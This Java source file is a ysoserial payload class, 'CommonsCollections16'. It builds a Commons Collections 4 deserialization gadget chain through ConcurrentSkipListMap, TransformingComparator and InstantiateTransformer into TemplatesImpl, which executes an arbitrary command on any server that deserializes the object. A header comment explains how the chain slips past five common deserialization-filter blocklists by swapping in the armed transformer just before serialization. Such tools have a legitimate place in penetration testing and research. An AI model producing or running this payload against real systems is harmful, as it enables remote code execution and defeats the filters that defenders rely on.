package ysoserial.payloads;

import java.io.Serializable;
import java.util.concurrent.ConcurrentSkipListMap;

import javax.xml.transform.Templates;

import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;

import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

/*
	ConcurrentSkipListMap entry point with InstantiateTransformer sink.
	Bypasses 5 common filter strategies simultaneously.

	Gadget chain:
		ObjectInputStream.readObject()
			ConcurrentSkipListMap.readObject()
				ConcurrentSkipListMap.put()
					TransformingComparator.compare()
						ChainedTransformer.transform()
							ConstantTransformer -> TrAXFilter.class
							InstantiateTransformer -> new TrAXFilter(TemplatesImpl)
								TemplatesImpl.newTransformer()
									... -> RCE

	Filter evasion:
		1. ConcurrentSkipListMap (java.util.concurrent) — not in any filter
		2. No HashMap/HashSet/Hashtable/PriorityQueue/TreeBag/TreeMap/TreeSet
		3. No InvokerTransformer (most commonly blocked CC class)
		4. No LazyMap/TiedMapEntry/DefaultedMap
		5. InstantiateTransformer rarely checked

	ConcurrentSkipListMap.readObject() rebuilds the skip list via put().
	put() calls comparator.compare() against existing keys for ordering.
	First entry: no compare. Second+ entry: compare is called.

	Construction: Integer keys 1,2 with safe InvokerTransformer("toString").
	Before serialization, TransformingComparator.transformer is swapped to
	armed ChainedTransformer. InvokerTransformer is NOT in the serialized stream.

	Requires:
		commons-collections4 4.0+
 */
@SuppressWarnings({"rawtypes", "unchecked", "restriction"})
@Dependencies({"org.apache.commons:commons-collections4:4.0"})
@Authors({ Authors.DMBS335 })
public class CommonsCollections16 extends PayloadRunner implements ObjectPayload<Serializable> {

	public Serializable getObject(final String command) throws Exception {
		Object templates = Gadgets.createTemplatesImpl(command);

		// Safe transformer for construction — toString() gives unique results per key
		InvokerTransformer safeTransformer = new InvokerTransformer(
			"toString", new Class[0], new Object[0]);
		TransformingComparator comp = new TransformingComparator(safeTransformer);

		// ConcurrentSkipListMap — novel entry point from java.util.concurrent
		ConcurrentSkipListMap<Object, Object> map = new ConcurrentSkipListMap<>(comp);
		map.put(1, "a");  // first entry — no compare call
		map.put(2, "b");  // second entry — compare(2, 1) via toString, safe

		// Armed chain: TrAXFilter(TemplatesImpl) — avoids InvokerTransformer in payload
		ConstantTransformer constant = new ConstantTransformer(TrAXFilter.class);
		InstantiateTransformer instantiate = new InstantiateTransformer(
			new Class[]{ Templates.class }, new Object[]{ templates });
		ChainedTransformer chain = new ChainedTransformer(
			new Transformer[]{ constant, instantiate });

		// Swap transformer — only ChainedTransformer+InstantiateTransformer are serialized
		Reflections.setFieldValue(comp, "transformer", chain);

		return map;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsCollections16.class, args);
	}
}
